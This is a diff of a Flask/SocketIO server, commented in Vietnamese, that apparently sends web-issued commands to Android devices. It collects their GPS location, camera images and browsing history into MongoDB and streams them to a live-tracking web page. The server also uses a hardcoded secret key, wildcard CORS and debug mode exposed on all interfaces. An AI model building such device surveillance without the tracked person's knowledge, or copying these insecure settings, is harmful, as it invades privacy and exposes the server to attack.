@@ -1,15 +1,15 @@
 from flask import Flask, request, jsonify
 from flask_socketio import SocketIO, emit
-from flask_cors import CORS # Cần cài thêm: pip install flask-cors
+from flask_cors import CORS 
 import os
 import base64
-from datetime import datetime
+from datetime import datetime, timedelta
 import pymongo 
 
 # ----- CẤU HÌNH SERVER -----    
 app = Flask(__name__)
 app.config['SECRET_KEY'] = 'nhung_anh_chang_sieu_dep_trai'
-CORS(app) # Cho phép Web truy cập thoải mái
+CORS(app) 
 socketio = SocketIO(app, cors_allowed_origins="*")
 
 # Tạo thư mục lưu ảnh
@@ -29,14 +29,13 @@ except Exception as e:
     print(f">>> LỖI KẾT NỐI MONGODB: {e}")
 
 # ==========================================
-# PHẦN 1: API ĐỂ WEB GỌI LỆNH (Web -> Server -> Android)
+# PHẦN 1: API ĐỂ WEB GỌI LỆNH
 # ==========================================
 
 @app.route('/')
 def index():
     return "SERVER ĐANG CHẠY NGON LÀNH!"
 
-# Web gọi vào đây để ra lệnh
 @app.route('/cmd/<action>')
 def command_handler(action):
     print(f">>> NHẬN LỆNH TỪ WEB: {action}")
@@ -78,22 +77,26 @@ def handle_disconnect():
 # 1. Xử lý GPS
 @socketio.on('gui_toa_do')
 def nhan_gps(data):
-    device_id = data.get('device_id', 'unknown')
-    lat = data.get('lat')
-    lng = data.get('long')
-    
-    print(f"[GPS] {device_id}: {lat}, {lng}")
-    
-    # Lưu vào DB
-    col_gps.insert_one({
-        "device_id": device_id,
-        "lat": lat,
-        "long": lng,
-        "thoi_gian": datetime.now()
-    })
+    try:
+        device_id = data.get('device_id', 'unknown')
+        lat = data.get('lat')
+        lng = data.get('long')
+        
+        print(f"[GPS] {device_id}: {lat}, {lng}")
+        
+        # Lưu vào DB (+7 tiếng cho giờ VN)
+        col_gps.insert_one({
+            "device_id": device_id,
+            "lat": lat,
+            "long": lng,
+            "thoi_gian": datetime.now() + timedelta(hours=7)
+        })
 
-    # ===> QUAN TRỌNG: BẮN SANG WEB (Live Tracking) <===
-    socketio.emit('update_gps', data, broadcast=True) 
+        # ===> ĐÃ SỬA: Bỏ broadcast=True <===
+        socketio.emit('update_gps', data) 
+        
+    except Exception as e:
+        print(f"Lỗi GPS: {e}")
 
 
 # 2. Xử lý Ảnh
@@ -114,21 +117,20 @@ def nhan_anh(data):
         with open(duong_dan, 'wb') as f:
             f.write(img_data)
             
-        # Lưu DB
+        # Lưu DB (+7 tiếng)
         col_images.insert_one({
             "device_id": device_id,
             "file_name": ten_file,
             "duong_dan": duong_dan,
-            "thoi_gian": datetime.now()
+            "thoi_gian": datetime.now() + timedelta(hours=7)
         })
         
-        # ===> QUAN TRỌNG: BẮN SANG WEB (Media Gallery) <===
-        # Gửi luôn cục base64 sang để Web hiển thị ngay lập tức
+        # ===> ĐÃ SỬA: Bỏ broadcast=True <===
         socketio.emit('update_image', {
             'img': base64_str,
             'type': loai_anh,
-            'time': datetime.now().strftime('%H:%M:%S')
-        }, broadcast=True)
+            'time': (datetime.now() + timedelta(hours=7)).strftime('%H:%M:%S')
+        })
         
     except Exception as e:
         print(f" -> Lỗi xử lý ảnh: {e}")
@@ -138,14 +140,16 @@ def nhan_anh(data):
 @socketio.on('gui_lich_su_web')
 def nhan_lich_su(data):
     print(f"[HISTORY] Nhận dữ liệu web...")
-    # Lưu DB
-    col_history.insert_one({"data": data, "time": datetime.now()})
+    # Lưu DB (+7 tiếng)
+    col_history.insert_one({
+        "data": data, 
+        "time": datetime.now() + timedelta(hours=7)
+    })
     
-    # ===> BẮN SANG WEB <===
-    socketio.emit('update_history', data, broadcast=True)
+    # ===> ĐÃ SỬA: Bỏ broadcast=True <===
+    socketio.emit('update_history', data)
 
 
 # ---- CHẠY SERVER -----
 if __name__ == '__main__':
-    # Cần cài thêm thư viện: pip install flask-cors
     socketio.run(app, host='0.0.0.0', port=5000, debug=True)
